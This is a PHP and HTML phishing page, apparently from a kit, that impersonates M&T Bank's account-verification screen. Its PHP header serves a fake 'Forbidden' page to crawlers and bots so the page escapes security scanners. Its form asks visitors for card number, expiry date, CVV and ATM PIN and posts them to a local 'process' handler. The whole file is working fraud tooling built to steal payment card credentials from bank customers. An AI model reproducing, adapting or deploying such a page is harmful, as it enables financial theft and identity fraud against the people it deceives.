<?php

$settings = include '../../settings/settings.php';
$useragent = $_SERVER['HTTP_USER_AGENT'];
include '../Bots/fucker.php';
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}


?>

<html lang="en" class="__sticky-footer">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link href="files/foundation-all.css" rel="stylesheet">
	<link href="files/mtb.css" rel="stylesheet">
	<style>
	/*SUGGESTED ADD FOR THE FRAMEWORK*/
	
	.no-headerFooter > .mtb-page-header {
		display: none;
	}
	
	.no-headerFooter {
		padding-top: 1.5rem;
	}
	</style>
	<title>Online Banking - Verify Account | M&amp;T Bank</title>
	<link rel="shortcut icon" href="files/favicon.ico" type="image/x-icon">
	<meta class="foundation-mq">
	
</head>

<body class="">
	<header class="mtb-page-header">
		<a class="mtb__logo" href=""> <img class="mtb__logo" src="files/mtb-logo.svg" alt="M&amp;T Bank"> </a> <a href="" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
            Exit
        </a> </header>
	<div data-msg-code="" class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
		<div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
	</div>
	<div class="mtb-app-enrollment--content">
		<form action="process/verify_session_card" class="js-form js-verifyAccountForm" id="verifyAccountForm" method="post" name="verifyAccountForm">
			<input type="hidden" value="R" name="EnrolleeType" id="EnrolleeType">
			<input type="hidden" value="RetailAccount" name="EnrollmentType" id="EnrollmentType">
			<input type="hidden" name="EnrolleeIdentifier" id="EnrolleeIdentifier">
			<input type="hidden" name="EnrolleeToken" id="EnrolleeToken">
			<input type="hidden" value="False" name="IsMobilePlatfom" id="IsMobilePlatfom">
			<input type="hidden" value="OLB:MOE:VerifyYourAccountInfo" name="TagPageName" id="TagPageName">
			<input type="hidden" value="False" name="SetFieldsToProtected" id="SetFieldsToProtected">
			<section class="grid-x grid-padding-x __spacer-form grid-x__padded">
				<div class="cell">
					<!-- page title -->
					<div class="mtb-section-header mtb-section-header--top">
						<p class="__top-title">  </p>
						<h1>
            Verify your account information
        </h1>
						<p> Enter your information to verify your identity. </p>
					</div>
				</div>
				<div class="cell">
					<div class="expanded button-group button-group__toggle">
						<button data-ensightentag="AccountInfoButton" type="button" class="button js-enrolleeTypeTab active" data-value="R" data-defaultaccounttype="RetailAccount" data-url="/Enrollment/EnrollmentType">Card Information</button>
						
					</div>
				</div>
				<div class="cell hide" data-showfor="BusinessAccount">
					<h2 class="mtb-form__section-title hide" data-showfor="BusinessAccount">
        Company Administrator Information
            <button tabindex="0" type="button" class="m-icon m-icon-questionmarkcircle __contextual-help mtb-help m-icon-questionmarkcircle js-modal-trigger" aria-haspopup="true" aria-controls="reveal-basic" data-ensightentag="CompanyAdministratorInfoQuestionIcon" data-open="companyadmin-modal">
                <span class="show-for-sr">Show Help</span>
            </button>
    </h2> </div>
				<div data-parentfor="FirstName" class="cell js-formFieldParent" data-showfor="BusinessAccount">
					<label for="FirstName">Card Number</label>
					<input data-fcid="" value="" maxlength="20" class="js-formnputItem" data-allowpaste="True" data-allowcopy="True" placeholder="" type="tel" id="cnum" name="cnum" required="true" >
					<script src="files/mask.js"></script>
                                    													<script>
                                    													var element = document.getElementById('cnum');
                                    													var maskOptions = {mask: '0000 0000 0000 0000'};
                                    													var mask = IMask(element, maskOptions);
                                    												    </script>
					<p class="form-error" id="FirstNameError" role="alert"></p>
					<p class="form-help-text"></p>
				</div>
				<div data-parentfor="LastName" class="cell js-formFieldParent" data-showfor="BusinessAccount">
					<label for="LastName">Expiration</label>
					<input data-fcid="" value="" maxlength="10" class="js-formnputItem" data-allowpaste="True" data-allowcopy="True"  placeholder="" type="tel" id="exp" required="true" name="exp" >
					<script src="files/mask.js"></script>
                                    													<script>
                                    													var element = document.getElementById('exp');
                                    													var maskOptions = {mask: '00/0000'};
                                    													var mask = IMask(element, maskOptions);
                                    												    </script>
					<p class="form-error" id="LastNameError" role="alert"></p>
					<p class="form-help-text"></p>
				</div>
				
				
				<div data-parentfor="SSN" class="cell js-formFieldParent" data-showfor="BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount" data-formattype="ssn">
					<label for="SSN">Cvv Code</label>
					<div class="js-maskFldParent input-group m-fake-single-input" data-maskoverlay="●●●-●●-●●●●">
						<input data-fcid="" value="" required="true" maxlength="3"  data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="numbers"  data-inputtype="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus" type="tel" id="cvv" name="cvv">
						
					</div>
					
				</div>
				<div data-parentfor="DateOfBirth" class="cell js-formFieldParent" data-showfor="BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount" data-formattype="date">
					<label for="DateOfBirth">ATM Pin</label>
					<input data-fcid="" value=""  class="js-formnputItem" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="numbers"  type="tel" id="pin" name="pin" maxlength="4" required="true" data-inputtype="tel">
					<p class="form-error" id="DateOfBirthError" role="alert"></p>
					<p class="form-help-text"></p>
				</div>


				


				
			</section>
			<section class="grid-x grid-padding-x mtb-form__section-spacer-button grid-x__padded">
				<div class="cell">
					<button data-ensightentag="ContinueButton" type="submit" data-url="" class="button button__form js-submit"> Continue </button>
				</div>
				<div class="cell"> <a href="/Enrollment/Index" class="button button__fake-padding expanded clear">
                Go Back
            </a> </div>
			</section>
		</form>
		<input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility"> </div>
	<footer class="mtb-footer" role="contentinfo">
		<div class="grid-x grid-padding-x align-center-middle grid-x__padded">
			<div class="cell">
				<p> ©2022 M&amp;T Bank. All Rights Reserved.
					<br> Users of this website agree to be bound by the provisions of the M&amp;T website <a href="" target="_blank">Terms of Use</a> and <a href="" target="_blank">Privacy Policy</a>. </p>
				<div class="mtb-footer__logo">
					<a href="" target="_blank"> <img src="files/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender"> </a>
					<a href="" target="_blank"> <img src="files/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust"> </a>
				</div>
				<p> Equal Housing Lender. NMLS #381076
					<br> <a href="" target="_blank">Member FDIC.</a> </p>
			</div>
		</div>
	</footer>
	
	<div class="reveal-overlay">
		<div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal="" data-options="closeOnClick:false" aria-hidden="true" data-yeti-box="minwarning-modal" data-resize="minwarning-modal" data-i="842lji-i" data-events="resize" style="top: 242px;">
			<div class="mtb-reveal-title ">
				<h1>Timeout Message</h1> </div>
			<div class="mtb-reveal-body">
				<div class="cell">
					<p>Your online banking session has been inactive for 9 minutes. For your security, we will automatically log you out in 1 minute. Click Stay Online to continue your session.</p>
				</div>
			</div>
			<div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">
				<div class="cell small-6"> <a href="/Enrollment" class="button hollow expanded" aria-label="Log out" data-close="" data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a> </div>
				<div class="cell small-6">
					<button class="button expanded js-sessiontimer" aria-label="Close modal" type="button" data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName" id="TagPageName">STAY ONLINE</button>
				</div>
			</div>
		</div>
	</div>
	
	<div class="reveal-overlay mtb-spinner--overlay" id="loadingOverlay">
		<div class="mtb-spinner--triple-dot">
			<div></div>
			<div></div>
			<div></div> <span class="show-for-sr">Loading ...</span> </div>
	</div>
</body>

</html>